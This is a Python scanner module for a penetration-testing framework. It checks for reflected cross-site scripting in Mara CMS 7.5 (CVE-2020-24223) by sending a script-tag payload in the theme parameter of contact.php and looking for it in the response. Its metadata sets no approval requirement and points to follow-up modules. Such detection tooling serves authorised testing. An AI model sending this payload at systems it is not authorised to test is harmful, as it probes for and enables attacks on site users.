#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Mara CMS 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Mara CMS  7.5 - Cross-Site Scripting Detection',
        'description': 'Mara CMS 7.5 allows reflected cross-site scripting in contact.php via the theme or pagetheme parameters.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'mara', 'xss', 'edb', 'mara_cms_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/48777',
            'https://sourceforge.net/projects/maracms/',
            'https://sourceforge.net/projects/maracms/files/MaraCMS75.zip/download',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-24223',
            'https://github.com/Elsfa7-110/kenzer-templates',
        ],
        'cve': 'CVE-2020-24223',
    }

    def run(self):
        r = self.http_request(method="GET", path='/contact.php?theme=tes%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('"><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Mara CMS  7.5 - Cross-Site Scripting detected",
                path='/contact.php?theme=tes%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E',
            )
            return True
        return False

